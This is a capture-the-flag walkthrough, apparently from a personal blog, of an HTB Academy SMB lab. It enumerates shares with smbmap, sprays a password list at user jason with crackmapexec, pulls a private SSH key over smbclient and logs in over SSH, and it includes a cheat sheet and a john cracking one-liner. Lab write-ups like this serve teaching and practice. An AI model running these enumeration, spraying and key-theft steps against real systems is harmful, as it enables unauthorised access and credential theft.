---
title: "HTB Attacking Common Services — Attacking SMB (Walkthrough)"
date: 2026-09-13 21:00:00 +0530
categories: [CPTS, "Attacking Common Services"]
tags: [smb, enumeration, smbclient, smbmap, crackmapexec, ssh, id_rsa]     # lowercase
---

## Overview

The **Attacking SMB** section of HTB's *Attacking Common Services* module ends with
a Linux target (`ACADEMY-ATTCOMSVC-LIN` / `ATTCSVC-LINUX`) and three questions that
chain into one realistic attack path:

1. Find the share with **READ** permissions.
2. Recover the password for user **jason**.
3. SSH in as jason and read `flag.txt`.

What makes this box worth writing up isn't a single clever command — it's the
**snag in the middle**: a null session lets you *see* a private SSH key but not
*read* it, so you have to earn credentials first. That's a far more realistic SMB
scenario than "anonymous share full of secrets."

> Target IP shown as it was during my session; yours will differ. **Flag redacted.**
> Run only against authorised lab targets.
{: .prompt-warning }

## Attack chain at a glance

```
null session ──► GGJ share is READ ONLY                    (Q1)
     │
     ▼
read id_rsa as guest ──► ACCESS DENIED                     ← the snag
     │
     ▼
brute-force jason with module's pws.list ──► password      (Q2)
     │
     ▼
re-read id_rsa AS jason ──► private key
     │
     ▼
ssh -i id_rsa jason@target ──► flag.txt                    (Q3)
```

## Q1 — Enumerate the shares

`smbmap` is better than `smbclient -L` here because it prints the **permission** on
each share:

```console
$ smbmap -H 10.129.107.32 -u guest

[+] IP: 10.129.107.32:445   Name: 10.129.107.32       Status: NULL Session
    Disk        Permissions   Comment
    ----        -----------   -------
    print$      NO ACCESS     Printer Drivers
    GGJ         READ ONLY     Priv
    IPC$        NO ACCESS     IPC Service (attcsvc-linux Samba)
```

`GGJ` is the only readable share — comment *"Priv"* is a nudge. List its contents:

```console
$ smbmap -H 10.129.107.32 -u guest -r GGJ

    ./GGJ
    fr--r--r--   3381   id_rsa
```

An **`id_rsa`** — a private SSH key. That's the target.

> **Q1 answer:** `GGJ`
{: .prompt-tip }

## The snag — listable ≠ readable

The obvious grab fails:

```console
$ smbclient //10.129.107.32/GGJ -N -c "get id_rsa"
NT_STATUS_ACCESS_DENIED opening remote file \id_rsa
```

An authenticated *guest* logon is denied too. And watch this trap — `smbmap
--download` reports nothing but silently leaves a **0-byte** stub, so always verify
a "download" actually produced bytes:

```console
$ file 10.129.107.29-GGJ_id_rsa
10.129.107.29-GGJ_id_rsa: empty
$ wc -c 10.129.107.29-GGJ_id_rsa
0 10.129.107.29-GGJ_id_rsa
```

The share ACL lets a null session **list** the directory, but the file's own owner
(jason, mode `600`) denies the read. **We need jason's credentials.**

## Q2 — Recover jason's password

jason's password is a long random string — it is **not** in `rockyou.txt`, so a
normal wordlist attack fails. The module ships its own list in the **Resources**
download (the hint: *"a colleague shared a password list you can find in the
resource"*). Unzip it and spray it at jason over SMB:

```console
$ unzip <resource>.zip
  inflating: pws.list

$ crackmapexec smb 10.129.107.32 -u jason -p pws.list --local-auth

SMB  10.129.107.32  445  ATTCSVC-LINUX  [*] Unix - Samba (name:ATTCSVC-LINUX) (signing:False) (SMBv1:None)
SMB  10.129.107.32  445  ATTCSVC-LINUX  [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE
SMB  10.129.107.32  445  ATTCSVC-LINUX  [-] ATTCSVC-LINUX\jason:theman    STATUS_LOGON_FAILURE
...
SMB  10.129.107.32  445  ATTCSVC-LINUX  [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh
```

`--local-auth` because the box is a standalone Samba host, not domain-joined. The
green `[+]` is the hit.

> **Two things that bite beginners here:**
> - Keep the whole command on **one line** — a stray newline makes bash run
>   `crackmapexec smb <ip>` alone and choke on `-u`.
> - Match the **exact filename** (`pws.list`, not `pws.txt`).
{: .prompt-info }
>
> **Q2 answer:** `34c8zuNBo91!@28Bszh`

## Read the key — this time as jason

Same `get`, now with valid creds — jason owns the file, so the read succeeds:

```console
$ smbclient //10.129.107.32/GGJ -U 'jason%34c8zuNBo91!@28Bszh' -c "get id_rsa"
getting file \id_rsa of size 3381 as id_rsa (10.9 KiloBytes/sec)

$ head -n 1 id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
```

That `head` check matters — it confirms you pulled a real key this time, not
another empty stub.

## Q3 — SSH in and grab the flag

```console
$ chmod 600 id_rsa                 # SSH refuses world-readable keys
$ ssh -i id_rsa jason@10.129.107.32

jason@attcsvc-linux:~$ cat flag.txt
HTB{············redacted············}
```

> **Q3 answer:** contents of `flag.txt` (redacted).
{: .prompt-tip }
>
> The key had no passphrase. If SSH *had* prompted for one:
> `ssh2john id_rsa > hash && john --wordlist=rockyou.txt hash`.

## Cheat-sheet

```bash
smbmap -H $TARGET -u guest                                       # shares + perms
smbmap -H $TARGET -u guest -r GGJ                                # browse the share
smbclient //$TARGET/GGJ -N -c "get id_rsa"                       # (denied as guest)
crackmapexec smb $TARGET -u jason -p pws.list --local-auth       # recover creds
smbclient //$TARGET/GGJ -U 'jason%<PASS>' -c "get id_rsa"        # read key as jason
chmod 600 id_rsa && ssh -i id_rsa jason@$TARGET                  # shell + flag
```

## Takeaways

- **`smbmap` over `smbclient -L`** for the permissions column.
- **Listable is not readable** — a null session can enumerate a directory whose
  files it can't open. Verify every download produced bytes (`wc -c` / `file`);
  `smbmap` leaves empty stubs on a denied read.
- **Not every password is crackable from `rockyou`** — when standard lists fail,
  look for a target- or module-provided list before assuming the account is safe.
- **One credential changed everything** — it turned a *listable* share into a
  *readable* one, and the key inside it into a shell.

## References

- HTB Academy — *Attacking Common Services* → Attacking SMB
- smbmap · smbclient · CrackMapExec documentation

<!--
PUBLISH NOTES:
- Flag redacted; steps kept in full (methodology-safe).
- Screenshots: blur the flag/creds, drop in assets/img/posts/smb/, reference like
  ![crackmapexec hit](/assets/img/posts/smb/cme-jason.png)
-->
